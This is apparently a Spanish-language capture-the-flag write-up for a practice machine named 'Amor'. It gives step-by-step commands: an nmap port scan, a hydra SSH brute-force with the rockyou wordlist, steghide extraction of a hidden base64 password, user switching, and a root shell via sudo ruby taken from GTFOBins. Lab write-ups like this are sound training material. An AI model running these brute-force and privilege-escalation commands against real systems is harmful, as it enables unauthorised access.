# MÁQUINA AMOR

Lo primero que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/Amor/foto.jpg)

Están abiertos tanto el puerto 80 como el 22, vamos a ver el contenido del puerto 80:

![WEB](https://github.com/Isma-yo/photos/blob/main/Amor/foto2.jpg)

Nos encontramos con una página en la que tenemos 2 posibles usuarios, Carlota y Juan. Además, también se dice que hay una contrasña insegura.

Vamos a probar a hacer un ataque de fuerza bruta a ambos nombres de usuario a ver si conseguimos su contraseña:

```shell
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![HYD](https://github.com/Isma-yo/photos/blob/main/Amor/foto3.jpg)

Hemos encontrado la contraseña del usuario carlota, por lo que vamos a acceder a la máquina a través de SSH:

![SSH](https://github.com/Isma-yo/photos/blob/main/Amor/foto4.jpg)

Ya estamos dentro, ahora tendremos que tratar la tty (terminal) con los siguientes comandos:

```shell
script /dev/null -c bash
```

```shell
Control Z
```

```shell
stty raw -echo; fg
```

```shell
reset xterm
```

```shell
export TERM=xterm
```

```shell
export SHELL=bash
```

```shell
stty rows 24 columns 126
```

Vemos que hay una imagen en uno de los directorios, vamos a descargarla en nuestra máquina para poder examinarla. Para ello usaremos el comando scp (DESDE NUESTRA MÁQUINA ATACANTE):

```shell
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/isma
```

![IMG](https://github.com/Isma-yo/photos/blob/main/Amor/foto5.jpg)

Utilizamos la herramientra steghide y obtenemos un fichero secret.txt que contiene una contraseña:

```shell
steghide extract -sf imagen.jpg
```

![PASS](https://github.com/Isma-yo/photos/blob/main/Amor/foto6.jpg)

Esta cifrada en base64 así que vamos a descifrarla:

```shell
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
```

![BAS](https://github.com/Isma-yo/photos/blob/main/Amor/foto7.jpg)

Y ahora si obtenemos una contraseña. Si hacemos un ls del directorio home podemos ver que ademas de carlota hay un usuario oscar, así que vamos a intentar convertirnos en el usando esta contraseña:

![OSC](https://github.com/Isma-yo/photos/blob/main/Amor/foto8.jpg)

Ya somos oscar, vamos a ver que puede ejeuctar como root usando el comando sudo -l. Vemos que puede ejecutar ruby como cualquier usuario y sin contraseña, usaremos esto para la escalada de privilegios.

Buscamos como escalar privilegios con ruby en GTFOBins y lo probamos:

https://gtfobins.github.io/gtfobins/ruby/#sudo

```shell
sudo ruby -e 'exec "/bin/sh"'
```

Y ya somos root!











